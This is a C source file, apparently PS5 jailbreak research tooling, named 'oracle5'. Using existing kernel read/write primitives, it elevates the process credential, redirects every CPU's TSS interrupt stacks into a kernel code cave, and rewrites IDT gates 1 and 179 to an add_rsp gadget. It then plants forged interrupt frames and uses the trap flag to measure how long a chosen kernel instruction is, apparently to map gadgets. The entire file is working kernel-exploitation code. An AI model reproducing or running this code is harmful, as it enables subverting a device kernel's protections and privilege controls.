/* oracle5 — TF one-instruction oracle, minimal form (proven oracle4 base).
 * gate179={add_rsp,ist6} pops candidate frame -> iretq to text+CAND in
 * kernel context with TF. First instruction traps #DB -> gate1={add_rsp,ist4}
 * pops catch frame -> db_landing in user. Fallback: scratch[0]=bare iretq
 * gadget, scratch[1..]=user landing, so a missed TF still lands.
 * Build with -DCAND_RVA=<rva>. */
#include <fcntl.h>
#include <inttypes.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include <ps5/kernel.h>

#define CAVE_RVA 0x2D29000ULL
#define GS_OFF 0x20000ULL
#define IST4_TOP (CAVE_RVA + GS_OFF + 0x1F0ULL)
#define IST6_TOP (CAVE_RVA + GS_OFF + 0x440ULL)
#define SCRATCH (CAVE_RVA + 0x800ULL)
#define NATIVE1_RVA 0x268dc0ULL
#define NATIVE179_RVA 0x268ef0ULL
#define ADD_RSP_RVA 0x257B36ULL
#define DORETI_RVA 0x257B3DULL
#ifndef CAND_RVA
#define CAND_RVA 0x255036ULL /* nop_ret */
#endif

static uint64_t g_rows[16];
static uint64_t g_save4[16], g_save6[16];
static uint8_t g_gate1[16], g_gate179[16];
volatile int g_marker;
uint64_t g_text, g_ustack, g_phase2, g_cand;

__attribute__((naked)) static void
enter_int_only(void) {
  __asm__ volatile("movl $5, g_marker(%rip)\n"
                   "int $0xB3\n"
                   "ud2\n");
}

__attribute__((naked)) static void
landing(void) {
  __asm__ volatile("mov g_phase2(%rip), %rax\n"
                   "call *%rax\n"
                   "mov $1, %rax\n"
                   "xor %rdi, %rdi\n"
                   "syscall\n"
                   "hlt\n");
}

static void
phase_db(void) {
  uint64_t f[5];
  uint64_t gs = g_text + CAVE_RVA + GS_OFF;
  printf("DB_LANDING cand=%#" PRIx64 "\n", g_cand);
  memset(f, 0, sizeof f);
  if(kernel_copyout((intptr_t)(gs + 0x1c8ULL), f, sizeof f) == 0) {
    printf("dbframe rip=%#" PRIx64 " cs=%#" PRIx64 " rfl=%#" PRIx64
           " rsp=%#" PRIx64 " ss=%#" PRIx64 "\n",
           f[0], f[1], f[2], f[3], f[4]);
    printf("instr_len=%lld rsp_delta=%#" PRIx64 " post_rsp=%#" PRIx64 "\n",
           (long long)((int64_t)f[0] - (int64_t)g_cand),
           f[3] - (uint64_t)(g_text + SCRATCH), f[3]);
  } else
    printf("dbframe read fail\n");
  printf("ORACLE_RESULT cand_rva=%#llx len=%lld\n",
         (unsigned long long)(g_cand - g_text),
         (long long)((int64_t)f[0] - (int64_t)g_cand));
  if(kernel_copyin(g_gate1,
                   (intptr_t)((uint64_t)KERNEL_ADDRESS_DATA_BASE +
                              0x2ee4300ULL + 1 * 16ULL),
                   16) ||
     kernel_copyin(g_gate179,
                   (intptr_t)((uint64_t)KERNEL_ADDRESS_DATA_BASE +
                              0x2ee4300ULL + 179 * 16ULL),
                   16))
    printf("disarm fail\n");
  for(int cpu = 0; cpu < 16; cpu++) {
    kernel_copyin(&g_save4[cpu], (intptr_t)(g_rows[cpu] + 0x3c), 8);
    kernel_copyin(&g_save6[cpu], (intptr_t)(g_rows[cpu] + 0x4c), 8);
  }
  printf("DB_DONE\n");
  fsync(STDOUT_FILENO);
}

static void
crash_handler(int sig, siginfo_t *si, void *uc) {
  (void)uc;
  char buf[96];
  int n = snprintf(buf, sizeof buf, "SIGNAL %d marker %d addr=%#llx\n", sig,
                   g_marker, (unsigned long long)si->si_addr);
  write(STDOUT_FILENO, buf, n);
  fsync(STDOUT_FILENO);
  _exit(99);
}

static int
readn(uint64_t a, void *b, size_t n) {
  return kernel_copyout((intptr_t)a, b, n);
}
static int
writen(uint64_t a, const void *b, size_t n) {
  return kernel_copyin(b, (intptr_t)a, n);
}
static void
mkgate(uint8_t *g, uint64_t target, uint8_t ist, uint8_t type) {
  uint16_t lo = (uint16_t)target, mid = (uint16_t)(target >> 16);
  uint32_t hi = (uint32_t)(target >> 32);
  memset(g, 0, 16);
  memcpy(g, &lo, 2);
  g[2] = 0x20;
  g[4] = ist;
  g[5] = type;
  memcpy(g + 6, &mid, 2);
  memcpy(g + 8, &hi, 4);
}
static uint64_t
gate_off(const uint8_t *g) {
  uint16_t lo = 0, mid = 0;
  uint32_t hi = 0;
  memcpy(&lo, g, 2);
  memcpy(&mid, g + 6, 2);
  memcpy(&hi, g + 8, 4);
  return ((uint64_t)hi << 32) | ((uint64_t)mid << 16) | lo;
}

int
main(void) {
  uint64_t data = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
  g_text = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
  g_cand = g_text + CAND_RVA;
  uint64_t tss = data + 0x2ee6fe0ULL;
  uint64_t idt = data + 0x2ee4300ULL;
  uint64_t gs = g_text + CAVE_RVA + GS_OFF;
  uint8_t g1[16], g179[16];
  int fd = open("/data/oracle5_1340.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if(fd >= 0) {
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    if(fd > STDERR_FILENO)
      close(fd);
  }
  setvbuf(stdout, NULL, _IONBF, 0);
  {
    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_sigaction = crash_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGILL, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGFPE, &sa, NULL);
  }

  printf("oracle5; fw=%#x text=%#" PRIx64 " cand=%#" PRIx64 "\n",
         kernel_get_fw_version(), g_text, g_cand);
  fsync(STDOUT_FILENO);
  if((kernel_get_fw_version() & 0xffff0000U) != 0x13400000U)
    return 1;
  kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);

  if(readn(idt + 16, g1, 16) || readn(idt + 179 * 16, g179, 16) ||
     gate_off(g1) != g_text + NATIVE1_RVA || g1[5] != 0x8e ||
     gate_off(g179) != g_text + NATIVE179_RVA || g179[4] != 0 || g179[5] != 0x8e) {
    printf("ABORT gates not native\n");
    return 3;
  }
  memcpy(g_gate1, g1, 16);
  memcpy(g_gate179, g179, 16);

  {
    uint64_t zeros[16];
    if(readn(gs + 0x800, zeros, sizeof zeros)) {
      printf("cave read fail\n");
      return 4;
    }
    for(size_t i = 0; i < 16; i++)
      if(zeros[i]) {
        printf("ABORT cave not zero\n");
        return 4;
      }
  }

  uint8_t *ust = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if(ust == MAP_FAILED) {
    printf("ustack mmap fail\n");
    return 5;
  }
  memset(ust, 0, 0x2000);
  g_ustack = (uint64_t)(uintptr_t)ust + 0x1800;
  g_phase2 = (uint64_t)(uintptr_t)&phase_db;

  for(int cpu = 0; cpu < 16; cpu++) {
    g_rows[cpu] = tss + (uint64_t)cpu * 0x68ULL;
    if(readn(g_rows[cpu] + 0x3c, &g_save4[cpu], 8) ||
       readn(g_rows[cpu] + 0x4c, &g_save6[cpu], 8)) {
      printf("tss read fail cpu=%d\n", cpu);
      return 6;
    }
    if(writen(g_rows[cpu] + 0x3c, &(uint64_t){g_text + IST4_TOP}, 8) ||
       writen(g_rows[cpu] + 0x4c, &(uint64_t){g_text + IST6_TOP}, 8)) {
      printf("tss arm fail cpu=%d\n", cpu);
      return 6;
    }
  }
  printf("tss -> cave x16\n");

  {
    uint64_t catchf[5] = {(uint64_t)(uintptr_t)&landing, 0x43, 0x202,
                          g_ustack, 0x3b};
    uint64_t candf[5] = {g_cand, 0x20, 0x102, g_text + SCRATCH, 0x28};
    uint64_t scratch[8] = {0};
    scratch[0] = g_text + DORETI_RVA;
    scratch[1] = (uint64_t)(uintptr_t)&landing;
    scratch[2] = 0x43;
    scratch[3] = 0x202;
    scratch[4] = g_ustack;
    scratch[5] = 0x3b;
    if(writen(gs + 0x2b0, catchf, sizeof catchf) ||
       writen(gs + 0x500, candf, sizeof candf) ||
       writen(g_text + SCRATCH, scratch, sizeof scratch)) {
      printf("plant fail\n");
      return 7;
    }
  }
  printf("frames planted\n");
  fsync(STDOUT_FILENO);

  mkgate(g1, g_text + ADD_RSP_RVA, 4, 0x8e);
  mkgate(g179, g_text + ADD_RSP_RVA, 6, 0xee);
  if(writen(idt + 16, g1, 16) || writen(idt + 179 * 16, g179, 16)) {
    printf("gate arm fail\n");
    return 8;
  }
  printf("gates armed; firing int\n");
  fsync(STDOUT_FILENO);

  g_marker = 0;
  enter_int_only();
  printf("returned past int marker=%d\n", g_marker);
  fsync(STDOUT_FILENO);
  return 0;
}
